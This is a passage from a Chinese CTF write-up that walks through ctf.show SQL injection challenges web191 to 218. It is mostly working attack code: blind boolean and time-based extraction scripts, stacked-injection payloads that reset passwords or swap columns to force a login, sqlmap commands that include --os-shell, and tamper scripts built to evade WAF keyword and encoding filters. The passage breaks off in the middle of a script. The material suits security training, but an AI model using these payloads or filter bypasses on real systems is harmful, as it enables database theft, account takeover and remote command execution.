        if r"""{"code":0,"msg":"\u5bc6\u7801\u9519\u8bef","count":0,"data":[]}""" in re.text:
            low = mid + 1
        else:
            high = mid
        mid = (high+low)//2
        if chr(mid) == " ":
            break
    flag += chr(mid)
    print(flag)
    if chr(mid) == '}':
        exit()
```

## web191 过滤ascii 的布尔盲注

```php
    if(preg_match('/file|into|ascii/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

出现过滤了 这里过滤了 ascii 我们看看怎么搞

其实这里换个payload即可

```csharp
admin' and if(substr((select database()),1,1)='c',0,1)
```

这里即可

但是这里有个bug  就是_会被识别为{

```cobol
import requests
 
url = "http://36a0d4e4-0612-48f3-9a51-e5b0b2b598ce.challenge.ctf.show/api/"
 
# payload = "admin' and if(substr((select database()),{0},1)>'{1}',0,1)-- +"
# payload = "admin' and if(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1)>'{1}',0,1)-- +"
# payload = "admin' and if(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_fl0g'),{0},1)>'{1}',0,1)-- +"
payload = "admin' and if(substr((select group_concat(id,'---',f1ag)from ctfshow_fl0g),{0},1)>'{1}',0,1)-- +"
flag =''
for i in range(1,100):
    high = 128
    low =32
    mid = (high+low)//2
    while(high>low):
        payload1= payload.format(i,chr(mid))
        # print(payload1)
        data ={
            'username':payload1,
            'password':0
        }
        re = requests.post(url =url ,data = data)
        # print(re.text)
        if r"\u7528\u6237\u540d\u4e0d\u5b58\u5728"  in re.text:
            low = mid + 1
        else:
            high = mid
        mid = (high+low)//2
        if chr(mid)== " ":
            break
    flag+=chr(mid)
    # print(flag.lower().replace('{','_'))
    print(flag.lower())
    if chr(mid) == "}":
        exit()
```

## web192 过滤 ord hex

又增加了 过滤

```php
  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii|ord|hex/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

好像对我这个没啥影响 继续打就行了

## web193 过滤 substr

```php
    if(preg_match('/file|into|ascii|ord|hex|substr/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

过滤了 substr 可以使用mid代替

```cobol
import requests
 
url = "http://5cfc18ff-19cb-48d1-942e-bc8c1c930634.challenge.ctf.show/api/"
 
# payload = "admin' and if(mid((select database()),{0},1)>'{1}',0,1)-- +"
# payload = "admin' and if(mid((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1)>'{1}',0,1)-- +"
# payload = "admin' and if(mid((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flxg'),{0},1)>'{1}',0,1)-- +"
payload = "admin' and if(mid((select group_concat(id,'---',f1ag)from ctfshow_flxg),{0},1)>'{1}',0,1)-- +"
flag =''
for i in range(1,100):
    high = 128
    low =32
    mid = (high+low)//2
    while(high>low):
        payload1= payload.format(i,chr(mid))
        # print(payload1)
        data ={
            'username':payload1,
            'password':0
        }
        re = requests.post(url =url ,data = data)
        # print(re.text)
        if r"\u7528\u6237\u540d\u4e0d\u5b58\u5728"  in re.text:
            low = mid + 1
        else:
            high = mid
        mid = (high+low)//2
        if chr(mid)== " ":
            break
    flag+=chr(mid)
    # print(flag.lower().replace('{','_'))
    print(flag.lower())
    if chr(mid) == "}":
        exit()
```

## web194 过滤 left right substring

```php
  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii|ord|hex|substr|char|left|right|substring/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

？ 好像还是可以继续 直接用上面的payload

## web195 堆叠注入 无引号的十六进制查询

这里我们首先来看看过滤内容

```php
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }
```

能发现 select 这些都被过滤了 空格也没了 但是没过滤 ` ;

所以可以考虑是否存在堆叠注入

过滤空格我们使用``绕过

我们先来看看数据库存在什么内容

```php
  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

这提示我们需要登入 然后就给flag 我们现在其实知道账号的 admin

然后我们这里需要通过 更新密码可以实现注入

本地测试

```cobol
select count(*) from user where name=admin;update`user`set`passwd`=0x313131;
```

然后我们去看看数据库



<img src="https://i-blog.csdnimg.cn/blog_migrate/530dcf7af4e34d703001c31a4db236e6.png" alt="" style="max-height:241px; box-sizing:content-box;" />


发现密码全部被修改为了 111 因为我们通过 update`表`set`字段`=密码

来修改了 所以内联注入可怕就是在 你可以和在本地执行sql一样进行任意操作（没被过滤）

所以我们到这道题就可以进行了

```swift
admin;update`ctfshow_user`set`pass`=222;
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/71c40699266911404b2db75a07f98893.png" alt="" style="max-height:367px; box-sizing:content-box;" />


但是出现问题了 这里无法成功登入 为什么呢

我们来看看查询语句

```php
$sql = "select pass from ctfshow_user where username = {$username};";
```

发现这里username没有被引号包裹 就类似于



<img src="https://i-blog.csdnimg.cn/blog_migrate/30f6ca3f26e9f0e214bf012ba4e77bb3.png" alt="" style="max-height:177px; box-sizing:content-box;" />


所以无法实现读取 我们只需要转变为 hex 然后数据库就会自动识别并且转为字符串 所以我们把admin变为 0x61646d696e

然后我们再试试看



<img src="https://i-blog.csdnimg.cn/blog_migrate/c2741f0803ea00663eda80a4cd5123f0.png" alt="" style="max-height:160px; box-sizing:content-box;" />


成功查询

然后我们就可以开始了



<img src="https://i-blog.csdnimg.cn/blog_migrate/87867a575ea988b109d311b37ccd8ee2.png" alt="" style="max-height:398px; box-sizing:content-box;" />


payload是

```cobol
0x61646d696e;update`ctfshow_user`set`pass`=222;
```

## web196 通过select 实现欺骗登入

一样查看过滤

```php
 
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }
```

好像还是没有过滤我们的东西

但是这里设置了

```php
  if(strlen($username)>16){
    $ret['msg']='用户名不能超过16个字符';
    die(json_encode($ret));
  }
```

不能超过16个 然后又要进行登入

这里就不会了

然后看了wp 说是出现了题目出错 这里其实不是过滤select 只是写个 se1ect 但是写错了 也没加上过滤

所以这里我们如何实现呢

我们继续测试

```cobol
select * from test where name = 'admin';select 9;
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/07604ac2b3e77585f954089e44e5b29c.png" alt="" style="max-height:123px; box-sizing:content-box;" />


发现返回的是9 所以我们可以通过这个逻辑进行登入

首先就是select 9  让pass 认为我们的密码是9

然后在pass中输入9  即可登入成功



<img src="https://i-blog.csdnimg.cn/blog_migrate/9e5e45755f4abc2e1e07b92400166dd3.png" alt="" style="max-height:588px; box-sizing:content-box;" />


## web197 select tables

继续 查看过滤

```php
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }
```

这里过滤了但是用户名可以很长

这里我也不会 但是看了wp 我发现这的题目其实就一个核心

你查询的东西 需要能返回你想要得值

例如 select 9  和 pass=9 这样我们就可以获取到flag

我们在数据库中 经常进入后会使用 show database; 这种指令



<img src="https://i-blog.csdnimg.cn/blog_migrate/d56d46139e939d38094785406057650c.png" alt="" style="max-height:213px; box-sizing:content-box;" />


这里正好 空格也放出来了 所以我们就可以使用这种方法登入

```cobol
username = 1;show tables;
password = ctfshow_user
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/65842330feb29cab386cc34bd4fb69aa.png" alt="" style="max-height:570px; box-sizing:content-box;" />


## web198 sql使字段的值互换

```php
 
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }
```

空格没被过滤

上一题payload继续打

然后这里在翻阅wp的时候发现了还有一种很新奇的方法

通过转变字段实现

这里使用的语句是

```sql
alter table ctfshow_user change column `pass` `ppp` varchar(255)
```

这里是一种修改字段值的方式 我们本地测试一下

首先我们记住原本的模样



<img src="https://i-blog.csdnimg.cn/blog_migrate/e0fad8b44928f02eddf21b0126feb622.png" alt="" style="max-height:93px; box-sizing:content-box;" />


然后这个时候其实就是修改字段名字

```sql
alter table user change column `passwd` `ppp` varchar(255);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3bf9f891d8a18dcabd99f24bb698b490.png" alt="" style="max-height:132px; box-sizing:content-box;" />


这个时候 原本名为 passwd的字段变为了 ppp字段

```sql
alter table user change column `id` `passwd` varchar(255);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d9a24d5ba480948c13ae38ab5734a978.png" alt="" style="max-height:234px; box-sizing:content-box;" />


这个时候 我们把原本的id修改为passwd字段

然后最后再把ppp修改为id字段

```sql
alter table user change column `ppp` `id` varchar(255);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b6ecc7f67f7dab52db342b94afefc871.png" alt="" style="max-height:187px; box-sizing:content-box;" />


这个时候我们是不是需要的是 passwd 和 name 来实现登入

而且我们知道name 我们是不是只需要爆破 passwd的id值 id肯定为数字 大不了就从0-1000

肯定会有的

这样我们就实现了登入

写一下脚本

```cobol
import requests
 
url = "http://f88e8a6b-de99-4b6d-a90b-8efe9fa533c9.challenge.ctf.show/api/"
 
for i in range(1000):
    if i == 0 :
        paylaod = {
            'username':"0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` varchar(255);",
            'password':i
        }
        re = requests.post(url=url,data=paylaod)
    data = {
        'username':'0x61646d696e',
        'password':i
    }
    r = requests.post(url=url, data=data)
    # print(r.text)
    if r"登陆成功" in r.json()['msg']:
        print(r.json()['msg'])
        break
```

出处

 [[CTFSHOW]SQL注入(WEB入门)_y4tacker ctfshow-CSDN博客](https://blog.csdn.net/solitudi/article/details/110144623) 

## web199 使用text 替换varchar(200)

这里过滤了括号 所以我们可以使用text来代替

```typescript
0;alter table ctfshow_user change `username` `passwd` text;alter table ctfshow_user change `pass` `username` text;alter table ctfshow_user change `passwd` `pass` text;
```

然后我们可以使用 username = 0 passwd = userAUTO

登入

或者使用show tables依旧可以

## web200

这里我们看看过滤内容

```php
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }
```

发现就多了一点内容 但是影响 199的也可以继续使用

## web201 SQLMAP-- GET

这里叫我们使用 sqlmap

并且需要通过--referer来指定检测 我们看看不使用referer会如何



<img src="https://i-blog.csdnimg.cn/blog_migrate/c22f60263d8e3d69af7cfe91590e685f.png" alt="" style="max-height:120px; box-sizing:content-box;" />


发现是无法实现的

这里有两个方式

### 指定referer

```cobol
py3 .\sqlmap.py -u "http://50b41e16-3b03-4cfc-a025-edb290b5eee0.challenge.ctf.show/api/?id=1"  --referer "ctf.show"
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9a9752b3bfed75f7b1f7a3e64bea2363.png" alt="" style="max-height:502px; box-sizing:content-box;" />


第二种

### 提高level

```cobol
py3 .\sqlmap.py -u "http://50b41e16-3b03-4cfc-a025-edb290b5eee0.challenge.ctf.show/api/?id=1"  --level 3
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b761f104af6ea70281e4290b0d9aedd4.png" alt="" style="max-height:500px; box-sizing:content-box;" />


提高level的时候 就会自动进行http的测试 所以在无法实现注入的时候 可以通过 level 5 尝试

这里我们就直接注入了

```cobol
py3 .\sqlmap.py -u "http://50b41e16-3b03-4cfc-a025-edb290b5eee0.challenge.ctf.show/api/?id=1"  --tables --level 3
 
 
py3 .\sqlmap.py -u "http://50b41e16-3b03-4cfc-a025-edb290b5eee0.challenge.ctf.show/api/?id=1"  -T "ctfshow_user" --columns --level 3
 
py3 .\sqlmap.py -u "http://50b41e16-3b03-4cfc-a025-edb290b5eee0.challenge.ctf.show/api/?id=1"  -T "ctfshow_user" -C "pass" --dump --level 3
```

## web202  SQLMAP -- POST

这里我有点不知道为什么 需要POST 没有提示 应该只是为了学习吧

其实这里我比较好奇这里的后端是怎么写的 为什么可以识别出是手注

```cobol
 py3 .\sqlmap.py -u "http://872c6e1d-2be9-48b4-83d3-f634c0e7e02b.challenge.ctf.show/api/"   --data "id=1" --dbs --level 3
```

## web203  SQLMAP -- PUT / CONTENT-TYPE

这里我们首先进行抓包 然后提示我们是用 method 所以我们这里修改为 put（其实我不知道为什么）

然后这里我们可以学习一个东西 如果我们想通过put 获取数据 我们需要制定 content/type

 [【精选】【web】 Http请求中请求头Content-Type讲解_请求头 content-type-CSDN博客](https://blog.csdn.net/m0_45406092/article/details/114022550) 

这里我们可以发现



<img src="https://i-blog.csdnimg.cn/blog_migrate/4de4019beb12da277c3402567e2ffa99.png" alt="" style="max-height:156px; box-sizing:content-box;" />


原本的内容是 表单的提交

现在 我们需要获取数据 我们就需要  text/plain   这里应该

这里就使用 sqlmap 来指定

```cobol
py3 .\sqlmap.py -u "http://9e044918-27ea-4835-bf60-d369eab19cb3.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3
```

然后就获取即可

## web204  指定cookie

这里提示我们cookie

所以我们看看能不能直接

直接f12查看即可



```cobol
py3 .\sqlmap.py -u  "http://f4141708-80bd-4fb0-8903-5c11ff50a884.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3 --cookie="tdf9n7i7koobo6tknorubjqfr8"
```

## web205 api的鉴权



<img src="https://i-blog.csdnimg.cn/blog_migrate/fccf5d24737ef93923afe1959ad77259.png" alt="" style="max-height:160px; box-sizing:content-box;" />


这里我们发现 请求一次查询的时候 会出现 getToken

这里预防注入的方式其实就是 每一次执行就给一个新的token 如果这个api没被泄露 就无法实现 工具的攻击

这里可以使用sqlmap 的两个参数

```sql
--safe-url 指定注入前需要访问的页面 这里就是我们鉴权的界面
 
--safe-freq  指定访问的次数 这里1次即可
```

```cobol
py3 .\sqlmap.py -u  "http://0c3cb676-6f97-4bc9-b90d-4d4a34b9d2fd.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3  --safe-url="http://0c3cb676-6f97-4bc9-b90d-4d4a34b9d2fd.challenge.ctf.show/api/getToken.php" --safe-freq=1
```

## web206

上一题 payload直接打

```cobol
py3 .\sqlmap.py -u  "http://ea1709ee-9337-452b-b66e-2709242193ef.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3  --safe-url="http://ea1709ee-9337-452b-b66e-2709242193ef.challenge.ctf.show/api/getToken.php" --safe-freq=1
```

## web207 tamper  过滤空格

这里开始编写tamper了

我丢 好难！！！！

开始学吧

先看这道题目

```php
//对传入的参数进行了过滤
  function waf($str){
   return preg_match('/ /', $str);
  }
```

发现如果匹配到空格就跳过 这里我们可以写一个最简单的tamper

```python
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__=  PRIORITY.NORMAL
 
def dependencies():
    singleTimeWarnMessage("第一次写的tamper，空格置换/**/")
def tamper(payload,**kwargs):
    return payload.replace(" ","/**/")
```

```cobol
py3 .\sqlmap.py -u  "http://c730dbae-83f1-4237-809e-0e03ccba5a8c.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3  --safe-url="http://c730dbae-83f1-4237-809e-0e03ccba5a8c.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper 2.py -v3
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/71fdac998a3aa693790f8e352d50043b.png" alt="" style="max-height:503px; box-sizing:content-box;" />


实现了注入 其实使用 space2comment也可以

## web208 双写select



```cobol
py3 .\sqlmap.py -u  "http://4d82d474-bc5a-465d-8101-34e5b964f486.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3  --safe-url="http://4d82d474-bc5a-465d-8101-34e5b964f486.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper 2.py -v3
```

```python
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__=  PRIORITY.NORMAL
 
def dependencies():
    singleTimeWarnMessage("空格置换/**/、双写绕过select")
def tamper(payload,**kwargs):
    return payload.replace(" ","/**/").replace("select","selselectect")
```

执行成功

```cobol
py3 .\sqlmap.py -u  "http://4d82d474-bc5a-465d-8101-34e5b964f486.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3  --safe-url="http://4d82d474-bc5a-465d-8101-34e5b964f486.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper 2.py -v3 
```

## web209 过滤=  *

```php
//对传入的参数进行了过滤
  function waf($str){
   //TODO 未完工
   return preg_match('/ |\*|\=/', $str);
  }
```

发现过滤了 * 和 = 这里我们使用其他的方式绕过  %0a 和 like绕过

```cobol
py3 .\sqlmap.py -u  "http://ef3984e4-cecd-4595-a5b8-159078089bc2.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3  --safe-url="http://ef3984e4-cecd-4595-a5b8-159078089bc2.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper 2.py -v3 
```

```cobol
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__=  PRIORITY.NORMAL
 
def dependencies():
    singleTimeWarnMessage("空格置换/**/、双写绕过select")
def tamper(payload,**kwargs):
    return payload.replace(" ",chr(0x0a)).replace("=",chr(0x0a)+'like'+chr(0x0a))
 
```

## web210  特殊加密的写法

```php
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
```

这里我们发现 是会对数据进行 一次解密 一次倒装 重复2次 所以我们也要一样执行

一次倒装 一次加密 重复2次即可

这里是python3的写法

```cobol
import base64
 
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__=  PRIORITY.NORMAL
 
def dependencies():
    singleTimeWarnMessage("空格置换/**/、双写绕过select")
def tamper(payload,**kwargs):
    payload = payload[::-1]
    payload1= base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    payload1 = payload1[::-1]
    payload2= base64.b64encode(payload1.encode('utf-8')).decode('utf-8')
    return payload2
```

```cobol
py3 .\sqlmap.py -u  "http://5dbc9b5c-7078-4015-8328-e47fe5cfe69d.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3  --safe-url="http://5dbc9b5c-7078-4015-8328-e47fe5cfe69d.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper 2.py -v3 
```

## web211  加密配合过滤

```php
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match('/ /', $str);
}
```

在前面的基础上 进行过滤 那我们直接在加密前 先替换即可

```cobol
import base64
 
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__=  PRIORITY.NORMAL
 
def dependencies():
    singleTimeWarnMessage("空格置换/**/、双写绕过select")
def tamper(payload,**kwargs):
    payload = payload.replace(" ","/**/")
    payload = payload[::-1]
    payload1= base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    payload1 = payload1[::-1]
    payload2= base64.b64encode(payload1.encode('utf-8')).decode('utf-8')
    return payload2
```

```cobol
py3 .\sqlmap.py -u  "http://3c1128a5-dfc8-489c-b3bf-84088eaa013d.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3  --safe-url="http://3c1128a5-dfc8-489c-b3bf-84088eaa013d.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper 2.py -v3 
```

## web212 过滤/**/

```php
//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match('/ |\*/', $str);
}
```

这里过滤了 *  使用 %0a即可

```cobol
import base64
 
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__=  PRIORITY.NORMAL
 
def dependencies():
    singleTimeWarnMessage("空格置换/**/、双写绕过select")
def tamper(payload,**kwargs):
    payload = payload.replace(" ",chr(0x09))
    payload = payload[::-1]
    payload1= base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    payload1 = payload1[::-1]
    payload2= base64.b64encode(payload1.encode('utf-8')).decode('utf-8')
    return payload2
```

```cobol
py3 .\sqlmap.py -u  "http://d7c73c70-2752-4eed-ac26-07a630620009.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3  --safe-url="http://d7c73c70-2752-4eed-ac26-07a630620009.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper 2.py -v3 
```

这里我发现上面发送的message都没有修改 但是其实也无所谓 大家别在意就可以了

## web213  --os-shell

这里提示我们一键getshell 使用上题 的payload

```cobol
py3 .\sqlmap.py -u  "http://608b47c7-03a2-47b2-b35f-1f82b7872875.challenge.ctf.show/api/index.php" --headers  "Content-Type: text/plain" --method PUT  --data "id=1" --level 3  --safe-url="http://608b47c7-03a2-47b2-b35f-1f82b7872875.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper 2.py -v3  --os-shell
```

然后直接默认即可 (就是出现输入就回车)



<img src="https://i-blog.csdnimg.cn/blog_migrate/4f5ae1cbccaaed156ed174e2e5b3cd2b.png" alt="" style="max-height:222px; box-sizing:content-box;" />


发现实现了注入 其实这里回车 就是让sqlmap去尝试默认的路径 和 php执行 然后就可以getshell

我们访问两个文件能发现 其实一个文件上传的源代码然后通过上传 实现getshell



<img src="https://i-blog.csdnimg.cn/blog_migrate/8d2a70f3b79e8634608a37fcc7b9f35e.png" alt="" style="max-height:540px; box-sizing:content-box;" />


## web214 时间盲注

这里开始我们的时间盲注了



<img src="https://i-blog.csdnimg.cn/blog_migrate/c85395bd51998699ea99b70daadf2a45.png" alt="" style="max-height:401px; box-sizing:content-box;" />


啥都么有

我们抓包看看

啥都没有 我也不知道咋搞 看wp吧

然后发现是ip的 所以我们开始手注一下

然后我们发现 其他都是回显语句 但是时间注入是ok的 所以这里其实后端是有查询



<img src="https://i-blog.csdnimg.cn/blog_migrate/3e802efcf9991b51dd6972c460f7456c.png" alt="" style="max-height:496px; box-sizing:content-box;" />


但是 echo $sql; 这种只是让你看到有sql语句

### 二分法

```cobol
ip=if(ascii(substr((select database()),1,1))>1,sleep(2),1)&debug=1
```

payload 确定 我们就开始写脚本

```cobol
import time
 
import requests
 
 
url = "http://9078350b-f715-47ae-8cea-211b548b03b4.challenge.ctf.show/api/"
 
# payload = "if(ascii(substr((select database()),{0},1))>{1},sleep(2),0)"
# payload = "if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))>{1},sleep(2),0)"
# payload = "if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagx'),{0},1))>{1},sleep(2),0)"
payload = "if(ascii(substr((select group_concat(id,'---',flaga,'---',info)from ctfshow_flagx),{0},1))>{1},sleep(2),0)"
flag = ''
 
for i in range(1,100):
    high = 128
    low = 32
    mid = (high+low)//2
    while(high>low):
        payload1=payload.format(i,mid)
        # print(payload1)
        # print(payload1)
        data = {
            'ip':payload1,
            'debug':0
        }
        start_time=time.time()
        re = requests.post(url=url,data=data)
        end_time=time.time()
        subtime=end_time-start_time
        # print(subtime)
        if subtime > 1.8:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
        if(chr(mid)==" "):
            break
    flag+=chr(mid)
    print(flag)
 
 
```



### SQLMAP

这里有没有人和我有一样的困惑 我都可以sqlmap绕waf 了这种简单的题目 我不是秒杀

确实是秒杀 ctfshow过滤sqlmap的方式貌似是请求次数

然后我们这里可以使用sqlmap

但是这我们最好通过r的方式执行

就是将请求包保存到本地 然后执行

```cobol
py3 .\sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --level 3   -v3 --technique=T --dbs
```

然后就可以发现实现了注入 不能通过-u的方式 不然实现不了 我原本以为是工具不智能呢,原来是我不智能........

## web215 字符注入

加了单引号 这里我们也是可以通过sqlmap直接跑的 和上题一模一样

然后脚本的话我们就需要加上注释

```cobol
import time
 
import requests
 
 
url = "http://dde5defa-638a-4d4c-8e6a-d362c3d14e58.challenge.ctf.show/api/"
 
# payload = "1' or if(ascii(substr((select database()),{0},1))>{1},sleep(2),0)-- +"
# payload = "1' or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))>{1},sleep(2),0)-- +"
# payload = "1' or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagxc'),{0},1))>{1},sleep(2),0)-- +"
payload = "1' or if(ascii(substr((select group_concat(id,'---',flagaa)from ctfshow_flagxc),{0},1))>{1},sleep(2),0)-- +"
flag = ''
 
for i in range(1,100):
    high = 128
    low = 32
    mid = (high+low)//2
    while(high>low):
        payload1=payload.format(i,mid)
        # print(payload1)
        # print(payload1)
        data = {
            'ip':payload1,
            'debug':0
        }
        start_time=time.time()
        re = requests.post(url=url,data=data)
        end_time=time.time()
        subtime=end_time-start_time
        # print(subtime)
        if subtime > 1.8:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
        if(chr(mid)==" "):
            break
    flag+=chr(mid)
    print(flag)
 
 
```

## web216 tamper配合时间注入

```bash
      where id = from_base64($id);
```

显示是这个

我们只要闭合这个函数即可

```cobol
'MQ==') or if(ascii(substr((select database()),{0},1))>{1},sleep(2),0)-- +
```

这里闭合完函数就会变为

```cobol
where id = from_base64('MQ==') or if(ascii(substr((select database()),{0},1))>{1},sleep(2),0)-- +);
 
这样就实现了注入了
```

这里其实也算是一种waf吧 我们可以通过编写tamper绕过

```python
import base64
 
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__=  PRIORITY.NORMAL
 
def dependencies():
    pass
def tamper(payload,**kwargs):
    payload = payload.replace("1'", "'MQ=='")
    return payload
```

```cobol
 py3 .\sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --level 3   -v3 --technique=T --prefix "')" --tamper 2.py
```

然后我们 指定一下 注入的闭合 就可以实现注入了 这里脚本 就是通过上面的payload修改一下即可

## web217  过滤sleep 通过 benchmark 实现注入

```php
    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep/i',$str);
    }   
```

哦吼 直接过滤了sleep

这里我们使用

```undefined
BENCHMARK
```

绕过 其实这个就是一个计算sha值的函数我们来测试  


<img src="https://i-blog.csdnimg.cn/blog_migrate/9fb18e0322a51a1fc3b35b2a2291789a.png" alt="" style="max-height:524px; box-sizing:content-box;" />


这里的payload就是

```cobol
1) or if(ascii(substr((select database()),{0},1))>{1},benchmark(100000000,sha('test')),0)-- +
```

可以发现 根据我们需要执行的次数 时间就会不一样 所以这里我们就可以通过benchmark实现时间注入

```cobol
import time
 
import requests
 
 
url = "http://18d8a67d-daf6-466e-a0b1-0ca752534667.challenge.ctf.show/api/"
 
# payload = "1) or if(ascii(substr((select database()),{0},1))>{1},benchmark(100000,sha('test')),0)-- +
# payload = "1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{0},1))>{1},benchmark(1000000,sha('test')),0)-- +"
# payload = "1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagxccb'),{0},1))>{1},benchmark(10000000,sha('test')),0)-- +"
payload = "1) or if(ascii(substr((select group_concat(id,'---',flagaabc)from ctfshow_flagxccb),{0},1))>{1},benchmark(10000000,sha('test')),0)-- +"
flag = ''

for i in range(1,100):
    high = 128
    low = 32
    mid = (high+low)//2
    while(high>low):
        payload1=payload.format(i,mid)
        # print(payload1)
        # print(payload1)
        data = {
            'ip':payload1,
            'debug':0
        }
        start_time=time.time()
        re = requests.post(url=url,data=data)
        end_time=time.time()
        subtime=end_time-start_time
        # print(subtime)
        if subtime > 0.4:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
        if(chr(mid)==" "):
            break
    flag+=chr(mid)
    print(flag)



```

修改tamper实现注入

```python
import base64
 
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__=  PRIORITY.NORMAL
 
def dependencies():
    pass
def tamper(payload,**kwargs):
    payload = payload.replace("SLEEP(5)", "BENCHMARK(1000000,SHA1('test'))")
    return payload
```

然后sqlmap就可以实现  但是需要尝试很多次 因为一次会显示注入失败 就是返回不了值 我也不知道为啥，但是确实我这边多试几次就可以了 这里如果执行完老是去数据中取数值

我们使用

```sql
--fresh-queries
```

让sqlmap重新注入  然后多尝试几次就行了

我第一次只出来了id 其他啥都没有



<img src="https://i-blog.csdnimg.cn/blog_migrate/08e627cd0f6a51dc373ed7707673e8a1.png" alt="" style="max-height:123px; box-sizing:content-box;" />


出现这个 就ok了 说明存在3个字段

## web218  过滤sleep  benchmark

赶尽杀绝啊

```php
    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep|benchmark/i',$str);
    }   
```

再去搜搜

搞了巨久 终于出来了 主要是卡在sqlmap的地方

这里的tamper是这样的

```python
import base64
 
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
 
__priority__=  PRIORITY.NORMAL
 
def dependencies():
    pass
def tamper(payload,**kwargs):
